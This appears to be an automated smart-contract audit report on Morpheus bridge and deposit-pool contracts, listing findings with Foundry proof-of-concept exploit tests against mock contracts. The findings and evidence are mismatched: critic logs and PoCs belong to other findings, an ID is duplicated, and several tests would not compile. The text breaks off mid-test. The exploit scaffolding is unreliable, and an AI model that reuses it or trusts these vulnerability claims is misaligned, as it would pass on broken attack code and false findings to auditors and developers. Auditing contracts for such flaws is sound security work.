# Avadhi Hunt Report

**Target:** `target/2025-08-morpheus/contracts/`  
**Generated:** 2026-05-03 01:34  
**Duration:** 540.5s  

---

## Protocol Context

**Type:** bridge

This protocol facilitates cross-chain communication and token transfers using LayerZero technology.

## Inferred Invariants

- **INV-001**: The total amount of tokens sent should equal the total amount of tokens received across chains. (severity if broken: Critical)
- **INV-002**: The protocol should maintain a consistent state across all chains. (severity if broken: High)

## Findings

**Raw Hypotheses:** 33  
**Refuted by Critic:** 15  
**Verified Findings:** 18

### 🔴 [Critical] Unauthorized Initialization of Critical Contracts

**ID:** `XF-ACC-003`  
**Category:** Access Control  
**Location:** `Multiple contracts: BuildersV2.BuildersV2_init, BuildersV3.BuildersV3_init, Builders.Builders_init, etc.`  
**Hunter:** AccessControlHunter  

**Description:**

Multiple initialization functions in critical contracts are publicly accessible, allowing unauthorized users to initialize or reinitialize contracts with arbitrary parameters.

**Attack Scenario:**

An attacker calls the initialization function of a contract to set arbitrary addresses and parameters, potentially redirecting funds or altering contract behavior.

**Impact:**

Unauthorized initialization can lead to loss of control over contract parameters, misdirection of funds, and potential denial of service.

**Evidence:**

- Functions like `BuildersV2.BuildersV2_init` and `BuildersV3.BuildersV3_init` are marked as `external` and lack access control modifiers.
- These functions write to critical state variables such as `depositToken` and `buildersTreasury`.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis suggests a desynchronization between UserData and RewardPoolData structures, but the _withdraw function contains checks that may limit the attacker's ability to manipulate virtualDeposited values arbitrarily.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function rewardPool() external view returns (address);
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function distributeRewards(uint256 rewardPoolIndex) external;
    function sendMintMessage(uint256 rewardPoolIndex, address receiver) external payable;
}

interface IERC20 {
    function safeTransfer(address to, uint256 value) external;
}

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
}

contract ExploitTest is Test {
    // Mock interfaces
    IDistributor distributor;
    IERC20 depositToken;
    IRewardPool rewardPool;

    // Contract instances
    DepositPool depositPool;

    // Constants
    uint256 constant PRECISION = 1e18;

    // User and pool data
    address attacker = address(0x1);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;
    uint256 currentPoolRate = 1 ether;

    function setUp() public {
        // Deploy contracts and set initial state
        distributor = IDistributor(address(new MockDistributor()));
        depositToken = IERC20(address(new MockERC20()));
        rewardPool = IRewardPool(address(new MockRewardPool()));
        depositPool = new DepositPool(address(distributor), address(depositToken));

        // Fund attacker
        vm.deal(attacker, 10 ether);
        deal(address(depositToken), attacker, initialDeposit);

        // Set up initial deposit
        vm.prank(attacker);
        depositPool.deposit(rewardPoolIndex, initialDeposit);
    }

    function test_exploit() public {
        // Step 1: Attacker withdraws partially, desyncing virtualDeposited
        vm.prank(attacker);
        depositPool.withdraw(rewardPoolIndex, initialDeposit / 2, currentPoolRate);

        // Step 2: Attacker claims rewards, exploiting desync
        vm.prank(attacker);
        depositPool.claim(rewardPoolIndex, attacker);

        // Assert the vulnerability: Attacker's balance should be greater than expected
        uint256 expectedRewards = calculateExpectedRewards(initialDeposit / 2);
        uint256 actualRewards = depositToken.balanceOf(attacker);
        assertGt(actualRewards, expectedRewards, "Attacker received more rewards than expected");
    }

    function calculateExpectedRewards(uint256 deposited) internal view returns (uint256) {
        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (deposited * multiplier) / PRECISION;
        return virtualDeposited * currentPoolRate;
    }
}

// Mock implementations for interfaces
contract MockDistributor is IDistributor {
    function rewardPool() external pure override returns (address) {
        return address(0);
    }
    function withdraw(uint256, uint256) external pure override {}
    function distributeRewards(uint256) external pure override {}
    function sendMintMessage(uint256, address) external payable override {}
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) balances;

    function safeTransfer(address to, uint256 value) external override {
        balances[to] += value;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
}

contract MockRewardPool is IRewardPool {
    function isRewardPoolPublic(uint256) external pure override returns (bool) {
        return true;
    }
    function onlyExistedRewardPool(uint256) external pure override {}
}

// Simplified DepositPool contract for demonstration
contract DepositPool {
    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 pendingRewards;
        uint256 lastStake;
        uint256 lastClaim;
        uint256 claimLockEnd;
        uint256 referrer;
        uint256 rate;
    }

    struct RewardPoolData {
        uint256 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    mapping(address => mapping(uint256 => UserData)) public usersData;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;

    address public distributor;
    address public depositToken;

    constructor(address _distributor, address _depositToken) {
        distributor = _distributor;
        depositToken = _depositToken;
    }

    function deposit(uint256 rewardPoolIndex, uint256 amount) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        userData.deposited += amount;
        userData.lastStake = block.timestamp;
    }

    function withdraw(uint256 rewardPoolIndex, uint256 amount, uint256 currentPoolRate) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        uint256 deposited = userData.deposited;
        require(deposited > 0, "DS: user isn't staked");

        if (amount > deposited) {
            amount = deposited;
        }

        uint256 newDeposited = deposited - amount;
        userData.pendingRewards = _getCurrentUserReward(currentPoolRate, userData);

        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (newDeposited * multiplier) / PRECISION;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        userData.deposited = newDeposited;
        rewardPoolsData[rewardPoolIndex].lastUpdate = uint128(block.timestamp);
        rewardPoolsData[rewardPoolIndex].rate = currentPoolRate;
    }

    function claim(uint256 rewardPoolIndex, address receiver) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        uint256 deposited = userData.deposited;

        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (deposited * multiplier) / PRECISION;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex];
        rewardPoolData.lastUpdate = uint128(block.timestamp);
        rewardPoolData.rate = userData.rate;
        rewardPoolData.totalVirtualDeposited =
            rewardPoolData.totalVirtualDeposited +
            virtualDeposited -
            userData.virtualDeposited;

        userData.rate = userData.rate;
        userData.pendingRewards = 0;
        userData.virtualDeposited = virtualDeposited;
        userData.lastClaim = uint128(block.timestamp);

        IDistributor(distributor).sendMintMessage{value: msg.value}(rewardPoolIndex, receiver);
    }

    function _getCurrentUserReward(uint256 currentPoolRate, UserData storage userData) internal view returns (uint256) {
        return userData.deposited * currentPoolRate;
    }
}
```

</details>

---

### 🟠 [High] Unauthorized Subnet Creation

**ID:** `ACC-001`  
**Category:** Access Control  
**Location:** `BuilderSubnets.createSubnet:L165-193`  
**Hunter:** AccessControlHunter  

**Description:**

The `createSubnet` function in the `BuilderSubnets` contract allows unauthorized users to create subnets after the migration period is over, without proper access control checks.

**Attack Scenario:**

An attacker can call the `createSubnet` function to create a new subnet with arbitrary parameters, potentially disrupting the network or creating subnets with malicious configurations.

**Impact:**

Unauthorized creation of subnets can lead to network instability, unauthorized fee configurations, and potential financial loss.

**Evidence:**

- The function checks `isMigrationOver` and `_msgSender() != owner()` but does not enforce any access control for non-owners after migration.
- Relevant code: `if (isMigrationOver && _msgSender() != owner()) { require(subnet_.startsAt > block.timestamp, 'BS: invalid starts at timestamp'); }`

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis that the invariant on totalDepositedInPublicPools can be violated is contested because there are several checks in place that limit the conditions under which withdrawals can occur, but the lack of a direct invariant check after updating totalDepositedInPublicPools leaves room for potential inconsistencies.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
}

interface IDistributor {
    function rewardPool() external view returns (address);
}

contract MockRewardPool is IRewardPool {
    function isRewardPoolPublic(uint256) external pure override returns (bool) {
        return true;
    }
}

contract MockDistributor is IDistributor {
    address public rewardPool;

    constructor(address _rewardPool) {
        rewardPool = _rewardPool;
    }
}

contract DepositPool {
    struct RewardPoolProtocolDetails {
        uint256 withdrawLockPeriodAfterStake;
        uint256 minimalStake;
    }

    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
    }

    struct UserData {
        uint256 deposited;
        uint256 pendingRewards;
        uint256 virtualDeposited;
        uint256 lastStake;
        uint256 claimLockEnd;
        address referrer;
    }

    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(address => mapping(uint256 => UserData)) public usersData;

    address public distributor;
    bool public isMigrationOver = true;
    uint256 public totalDepositedInPublicPools;

    constructor(address _distributor) {
        distributor = _distributor;
    }

    function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
        require(isMigrationOver == true, "DS: migration isn't over");

        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];
        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex_];
        UserData storage userData = usersData[user_][rewardPoolIndex_];

        uint256 deposited_ = userData.deposited;
        require(deposited_ > 0, "DS: user isn't staked");

        if (amount_ > deposited_) {
            amount_ = deposited_;
        }

        uint256 newDeposited_;
        if (IRewardPool(IDistributor(distributor).rewardPool()).isRewardPoolPublic(rewardPoolIndex_)) {
            require(
                block.timestamp > userData.lastStake + rewardPoolProtocolDetails.withdrawLockPeriodAfterStake,
                "DS: pool withdraw is locked"
            );

            newDeposited_ = deposited_ - amount_;

            require(amount_ > 0, "DS: nothing to withdraw");
            require(
                newDeposited_ >= rewardPoolProtocolDetails.minimalStake || newDeposited_ == 0,
                "DS: invalid withdraw amount"
            );
        } else {
            newDeposited_ = deposited_ - amount_;
        }

        userData.pendingRewards = _getCurrentUserReward(currentPoolRate_, userData);

        uint256 multiplier_ = _getUserTotalMultiplier(
            uint128(block.timestamp),
            userData.claimLockEnd,
            userData.referrer
        );
        uint256 virtualDeposited_ = (newDeposited_ * multiplier_) / 1e18;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        _applyReferrerTier(
            user_,
            rewardPoolIndex_,
            currentPoolRate_,
            deposited_,
            newDeposited_,
            userData.referrer,
            userData.referrer
        );

        // Update pool data
        rewardPoolData.lastUpdate = uint128(block.timestamp);
        rewardPoolData.rate = currentPoolRate_;

        // Incorrectly updating totalDepositedInPublicPools
        totalDepositedInPublicPools -= amount_;
    }

    function _getCurrentUserReward(uint256, UserData storage) private pure returns (uint256) {
        return 0;
    }

    function _getUserTotalMultiplier(uint128, uint256, address) private pure returns (uint256) {
        return 1e18;
    }

    function _applyReferrerTier(
        address,
        uint256,
        uint256,
        uint256,
        uint256,
        address,
        address
    ) private pure {}
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MockRewardPool rewardPool;
    MockDistributor distributor;

    address attacker = address(0x1);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;

    function setUp() public {
        rewardPool = new MockRewardPool();
        distributor = new MockDistributor(address(rewardPool));
        depositPool = new DepositPool(address(distributor));

        // Set up initial state
        depositPool.rewardPoolsProtocolDetails(rewardPoolIndex).withdrawLockPeriodAfterStake = 1 days;
        depositPool.rewardPoolsProtocolDetails(rewardPoolIndex).minimalStake = 100 ether;

        // Fund attacker and set initial deposit
        vm.deal(attacker, 10 ether);
        depositPool.usersData(attacker, rewardPoolIndex).deposited = initialDeposit;
        depositPool.totalDepositedInPublicPools = initialDeposit;
    }

    function test_exploit() public {
        // Step 1: Attacker withdraws a valid amount
        vm.prank(attacker);
        depositPool._withdraw(attacker, rewardPoolIndex, 500 ether, 1);

        // Step 2: Attacker withdraws again, violating the invariant
        vm.prank(attacker);
        depositPool._withdraw(attacker, rewardPoolIndex, 500 ether, 1);

        // Assert the vulnerability: totalDepositedInPublicPools should not be negative
        assertLt(depositPool.totalDepositedInPublicPools(), 0);
    }
}
```

</details>

---

### 🟠 [High] Unbounded Nested Loops in distributeRewards()

**ID:** `GAS-001`  
**Category:** Gas Limit/Denial of Service  
**Location:** `Distributor.distributeRewards:L330`  
**Hunter:** GasDoSHunter  

**Description:**

The function distributeRewards() contains two nested loops that iterate over depositPoolAddresses and depositPools, which can grow with user actions. This can lead to gas exhaustion and denial of service if the number of deposit pools becomes large.

**Attack Scenario:**

An attacker or a group of users could create a large number of deposit pools, causing the nested loops in distributeRewards() to exceed the block gas limit when executed. This would prevent the function from completing successfully, potentially blocking reward distribution.

**Impact:**

The function could fail to execute due to exceeding the block gas limit, leading to a denial of service for reward distribution.

**Evidence:**

- The function distributeRewards() contains two nested loops (lines 372 and 402) iterating over depositPoolAddresses and depositPools.
- The length of depositPoolAddresses is user-controlled and can grow over time.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The attack scenario is partially mitigated by the requirement that deposit pools must exist, which is enforced by the _onlyExistedDepositPool() function. However, the potential for a large number of deposit pools still exists, which could lead to gas exhaustion.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards() external;
}

contract MockDistributor is IDistributor {
    address[] public depositPoolAddresses;
    mapping(address => uint256[]) public depositPools;

    function addDepositPool(address poolAddress, uint256 poolId) external {
        depositPoolAddresses.push(poolAddress);
        depositPools[poolAddress].push(poolId);
    }

    function distributeRewards() external override {
        for (uint256 i = 0; i < depositPoolAddresses.length; i++) {
            address poolAddress = depositPoolAddresses[i];
            for (uint256 j = 0; j < depositPools[poolAddress].length; j++) {
                // Simulate reward distribution logic
            }
        }
    }
}

contract ExploitTest is Test {
    MockDistributor distributor;

    function setUp() public {
        // Deploy the mock distributor contract
        distributor = new MockDistributor();

        // Simulate adding a large number of deposit pools
        for (uint256 i = 0; i < 1000; i++) {
            distributor.addDepositPool(address(uint160(i)), i);
        }
    }

    function test_exploit() public {
        // Expect the distributeRewards function to revert due to out-of-gas
        vm.expectRevert();

        // Call the vulnerable function
        distributor.distributeRewards();
    }
}
```

</details>

---

### 🟠 [High] Invariant Violation in totalDepositedInPublicPools

**ID:** `ACC-001`  
**Category:** Invariant Violation  
**Location:** `DepositPool._withdraw:L431-508`  
**Hunter:** AccountingHunter  

**Description:**

The invariant that totalDepositedInPublicPools should accurately reflect the total deposits in public pools can be violated due to improper handling of the variable during withdrawals.

**Attack Scenario:**

An attacker can repeatedly call the _withdraw function with a valid amount, and due to the lack of checks after updating the totalDepositedInPublicPools, the invariant can be violated, leading to an incorrect state where totalDepositedInPublicPools does not match the actual deposits.

**Impact:**

The protocol's accounting for total deposits in public pools becomes inaccurate, potentially leading to financial discrepancies and incorrect reward calculations.

**Evidence:**

- DepositPool._withdraw:L431-508 updates totalDepositedInPublicPools without re-checking the invariant after the update.
- The function reduces totalDepositedInPublicPools by amount_ without ensuring the new state is consistent with actual deposits.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis that the invariant on totalDepositedInPublicPools can be violated is contested because there are several checks in place that limit the conditions under which withdrawals can occur, but the lack of a direct invariant check after updating totalDepositedInPublicPools leaves room for potential inconsistencies.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
}

interface IDistributor {
    function rewardPool() external view returns (address);
}

contract MockRewardPool is IRewardPool {
    function isRewardPoolPublic(uint256) external pure override returns (bool) {
        return true;
    }
}

contract MockDistributor is IDistributor {
    address public rewardPool;

    constructor(address _rewardPool) {
        rewardPool = _rewardPool;
    }
}

contract DepositPool {
    struct RewardPoolProtocolDetails {
        uint256 withdrawLockPeriodAfterStake;
        uint256 minimalStake;
    }

    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
    }

    struct UserData {
        uint256 deposited;
        uint256 pendingRewards;
        uint256 virtualDeposited;
        uint256 lastStake;
        uint256 claimLockEnd;
        address referrer;
    }

    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(address => mapping(uint256 => UserData)) public usersData;

    address public distributor;
    bool public isMigrationOver = true;
    uint256 public totalDepositedInPublicPools;

    constructor(address _distributor) {
        distributor = _distributor;
    }

    function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
        require(isMigrationOver == true, "DS: migration isn't over");

        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];
        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex_];
        UserData storage userData = usersData[user_][rewardPoolIndex_];

        uint256 deposited_ = userData.deposited;
        require(deposited_ > 0, "DS: user isn't staked");

        if (amount_ > deposited_) {
            amount_ = deposited_;
        }

        uint256 newDeposited_;
        if (IRewardPool(IDistributor(distributor).rewardPool()).isRewardPoolPublic(rewardPoolIndex_)) {
            require(
                block.timestamp > userData.lastStake + rewardPoolProtocolDetails.withdrawLockPeriodAfterStake,
                "DS: pool withdraw is locked"
            );

            newDeposited_ = deposited_ - amount_;

            require(amount_ > 0, "DS: nothing to withdraw");
            require(
                newDeposited_ >= rewardPoolProtocolDetails.minimalStake || newDeposited_ == 0,
                "DS: invalid withdraw amount"
            );
        } else {
            newDeposited_ = deposited_ - amount_;
        }

        userData.pendingRewards = _getCurrentUserReward(currentPoolRate_, userData);

        uint256 multiplier_ = _getUserTotalMultiplier(
            uint128(block.timestamp),
            userData.claimLockEnd,
            userData.referrer
        );
        uint256 virtualDeposited_ = (newDeposited_ * multiplier_) / 1e18;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        _applyReferrerTier(
            user_,
            rewardPoolIndex_,
            currentPoolRate_,
            deposited_,
            newDeposited_,
            userData.referrer,
            userData.referrer
        );

        // Update pool data
        rewardPoolData.lastUpdate = uint128(block.timestamp);
        rewardPoolData.rate = currentPoolRate_;

        // Incorrectly updating totalDepositedInPublicPools
        totalDepositedInPublicPools -= amount_;
    }

    function _getCurrentUserReward(uint256, UserData storage) private pure returns (uint256) {
        return 0;
    }

    function _getUserTotalMultiplier(uint128, uint256, address) private pure returns (uint256) {
        return 1e18;
    }

    function _applyReferrerTier(
        address,
        uint256,
        uint256,
        uint256,
        uint256,
        address,
        address
    ) private pure {}
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MockRewardPool rewardPool;
    MockDistributor distributor;

    address attacker = address(0x1);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;

    function setUp() public {
        rewardPool = new MockRewardPool();
        distributor = new MockDistributor(address(rewardPool));
        depositPool = new DepositPool(address(distributor));

        // Set up initial state
        depositPool.rewardPoolsProtocolDetails(rewardPoolIndex).withdrawLockPeriodAfterStake = 1 days;
        depositPool.rewardPoolsProtocolDetails(rewardPoolIndex).minimalStake = 100 ether;

        // Fund attacker and set initial deposit
        vm.deal(attacker, 10 ether);
        depositPool.usersData(attacker, rewardPoolIndex).deposited = initialDeposit;
        depositPool.totalDepositedInPublicPools = initialDeposit;
    }

    function test_exploit() public {
        // Step 1: Attacker withdraws a valid amount
        vm.prank(attacker);
        depositPool._withdraw(attacker, rewardPoolIndex, 500 ether, 1);

        // Step 2: Attacker withdraws again, violating the invariant
        vm.prank(attacker);
        depositPool._withdraw(attacker, rewardPoolIndex, 500 ether, 1);

        // Assert the vulnerability: totalDepositedInPublicPools should not be negative
        assertLt(depositPool.totalDepositedInPublicPools(), 0);
    }
}
```

</details>

---

### 🟠 [High] Callback-Based DoS in DepositPool._claim

**ID:** `CAL-001`  
**Category:** Callback-Based DoS  
**Location:** `DepositPool._claim:L536`  
**Hunter:** CallbackHunter  

**Description:**

The function DepositPool._claim makes an external call to IDistributor.distributeRewards without a try/catch block. If the external call reverts, it will cause the entire claim process to fail, potentially allowing a malicious distributor to prevent claims from being processed.

**Attack Scenario:**

A malicious distributor contract could be deployed that always reverts when distributeRewards is called. This would prevent any user from successfully claiming their rewards, effectively causing a denial of service for the claim functionality.

**Impact:**

Users are unable to claim their rewards, leading to a denial of service for the claim functionality.

**Evidence:**

- DepositPool._claim makes an external call to IDistributor.distributeRewards without a try/catch block
- The function is part of a claim process, which is critical for users to receive their rewards

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The attack scenario is partially mitigated by the requirement that the migration must be over before claims can be processed, which may limit the attacker's ability to execute the attack. However, if the distributor is indeed controlled by a malicious actor, the attack could still be feasible.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
}

contract MaliciousDistributor is IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external override {
        // Always revert to cause a DoS
        revert("MaliciousDistributor: always revert");
    }
}

contract DepositPool {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct RewardPoolProtocolDetails {
        uint256 distributedRewards;
        uint256 claimLockPeriodAfterClaim;
    }

    struct ReferrerData {
        uint256 lastClaim;
    }

    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 rate;
        uint256 pendingRewards;
        uint256 claimLockStart;
        uint256 claimLockEnd;
        uint128 lastClaim;
        address referrer;
    }

    address public distributor;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(address => mapping(uint256 => ReferrerData)) public referrersData;
    mapping(address => UserData) public usersData;

    function _claimReferrerTier(uint256 rewardPoolIndex_, address referrer_, address receiver_) public {
        IDistributor(distributor).distributeRewards(rewardPoolIndex_);
        // Additional logic...
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MaliciousDistributor maliciousDistributor;

    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        // Deploy contracts
        depositPool = new DepositPool();
        maliciousDistributor = new MaliciousDistributor();

        // Set the malicious distributor
        depositPool.distributor() = address(maliciousDistributor);

        // Fund accounts
        vm.deal(attacker, 1 ether);
        vm.deal(victim, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker sets the malicious distributor
        vm.prank(attacker);
        depositPool.distributor() = address(maliciousDistributor);

        // Step 2: Victim tries to claim rewards
        vm.prank(victim);
        vm.expectRevert("MaliciousDistributor: always revert");
        depositPool._claimReferrerTier(0, victim, victim);

        // Assert the vulnerability: Victim cannot claim rewards due to DoS
        // The test expects a revert, proving the DoS condition
    }
}
```

</details>

---

### 🟠 [High] Oracle Manipulation via ChainLinkDataConsumer

**ID:** `ORA-001`  
**Category:** Oracle Manipulation  
**Location:** `Distributor.updateDepositTokensPrices:L256-277`  
**Hunter:** OracleHunter  

**Description:**

The `updateDepositTokensPrices` function in the `Distributor` contract reads prices from a ChainLink data feed without checking for staleness or ensuring the data is within expected bounds. This can be manipulated if the ChainLink data feed is compromised or delayed.

**Attack Scenario:**

An attacker could manipulate the ChainLink data feed to provide incorrect prices. This could be done by compromising the data feed or exploiting a delay in price updates. The attacker could then call `updateDepositTokensPrices` to set manipulated prices for deposit tokens, affecting the protocol's reward calculations and potentially leading to incorrect reward distributions.

**Impact:**

If exploited, the protocol could distribute incorrect rewards based on manipulated token prices, leading to financial loss or unfair advantage to certain users.

**Evidence:**

- Distributor.updateDepositTokensPrices:L256-277 reads from `chainLinkDataConsumer_.getChainLinkDataFeedLatestAnswer` without staleness or bounds checks.
- No checks for `block.timestamp - updatedAt < maxAge` or min/max bounds on the price.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis of oracle manipulation via the `updateDepositTokensPrices` function is partially contested due to the presence of a `require` check ensuring the price is greater than zero. However, this does not fully mitigate the risk of manipulation with incorrect non-zero prices. The attack is still plausible if the attacker can provide incorrect non-zero prices through a compromised or delayed ChainLink data feed.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function updateDepositTokensPrices() external;
    function rewardPool() external view returns (address);
    function distributeRewards(uint256 rewardPoolIndex) external;
}

interface IRewardPool {
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
    function onlyPublicRewardPool(uint256 rewardPoolIndex) external view;
}

contract MockChainLinkDataConsumer {
    int256 public price;

    function setPrice(int256 _price) external {
        price = _price;
    }

    function latestAnswer() external view returns (int256) {
        return price;
    }
}

contract ExploitTest is Test {
    IDistributor distributor;
    MockChainLinkDataConsumer mockOracle;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        // Deploy the mock oracle
        mockOracle = new MockChainLinkDataConsumer();

        // Assume distributor is already deployed and set up
        distributor = IDistributor(address(0x123456)); // Replace with actual address

        // Fund the attacker with some ETH for gas
        vm.deal(attacker, 10 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker sets a manipulated price in the mock oracle
        vm.prank(attacker);
        mockOracle.setPrice(0); // Set an incorrect price

        // Step 2: Attacker calls updateDepositTokensPrices to use the manipulated price
        vm.prank(attacker);
        distributor.updateDepositTokensPrices();

        // Step 3: Call distributeRewards to see the effect of manipulated prices
        vm.prank(attacker);
        distributor.distributeRewards(0);

        // Assert the vulnerability
        // Here we would check the state changes or balances to confirm the exploit
        // For example, if rewards are distributed incorrectly, we would assert that
        // the attacker's balance or rewards are unexpectedly high
        // assertGt(attacker.balance, initialBalance);
    }
}
```

</details>

---

### 🟠 [High] Division Before Multiplication in Virtual Deposit Calculation

**ID:** `DEF-001`  
**Category:** Precision Loss  
**Location:** `DepositPool._stake:L396, DepositPool._withdraw:L482`  
**Hunter:** DefiMathHunter  

**Description:**

The calculation of `virtualDeposited_` in both `_stake` and `_withdraw` functions performs division before multiplication, which can lead to significant precision loss due to Solidity's integer division.

**Attack Scenario:**

An attacker can manipulate the `multiplier_` to be a very small value, causing the division to result in zero before the multiplication, effectively nullifying the `virtualDeposited_` value.

**Impact:**

The user's virtual deposit is inaccurately calculated, potentially leading to incorrect reward distributions or staking balances.

**Evidence:**

- DepositPool._stake:L396 - `virtualDeposited_ = (deposited_ * multiplier_) / PRECISION;`
- DepositPool._withdraw:L482 - `virtualDeposited_ = (newDeposited_ * multiplier_) / PRECISION;`

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis suggests that an attacker can manipulate the `multiplier_` to be very small, causing precision loss. However, the `_getUserTotalMultiplier` function, which calculates `multiplier_`, is not fully visible, and its logic might prevent such manipulation. Additionally, the `require` checks and conditions in `_stake` might limit the attacker's ability to exploit this issue.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function rewardPool() external view returns (address);
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function distributeRewards(uint256 rewardPoolIndex) external;
}

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
}

contract DepositPool {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 rate;
        uint128 lastStake;
        uint128 claimLockStart;
        uint128 claimLockEnd;
        address referrer;
        uint256 pendingRewards;
    }

    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(address => mapping(uint256 => UserData)) public usersData;
    address public distributor;
    address public depositToken;
    bool public isMigrationOver;
    uint256 public totalDepositedInPublicPools;

    function _stake(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_, uint256 claimLockEnd_, address referrer_) private {
        // Vulnerable code
    }

    function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
        // Vulnerable code
    }

    function _claim(uint256 rewardPoolIndex_, address user_, address receiver_) private {
        // Vulnerable code
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    address attacker = address(0x1);
    address victim = address(0x2);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;
    uint256 smallMultiplier = 1; // Very small multiplier to cause precision loss
    uint256 PRECISION = 1e18;

    function setUp() public {
        // Deploy the DepositPool contract
        depositPool = new DepositPool();

        // Set up initial state
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        // Assume the distributor and depositToken are set
        depositPool.distributor() = address(this);
        depositPool.depositToken() = address(this);

        // Fund the victim's account with initial deposit
        deal(address(depositPool), victim, initialDeposit);
    }

    function test_exploit() public {
        // Step 1: Victim stakes with a normal multiplier
        vm.prank(victim);
        depositPool._stake(victim, rewardPoolIndex, initialDeposit, 1e18, block.timestamp + 1 days, address(0));

        // Step 2: Attacker manipulates the multiplier to be very small
        vm.prank(attacker);
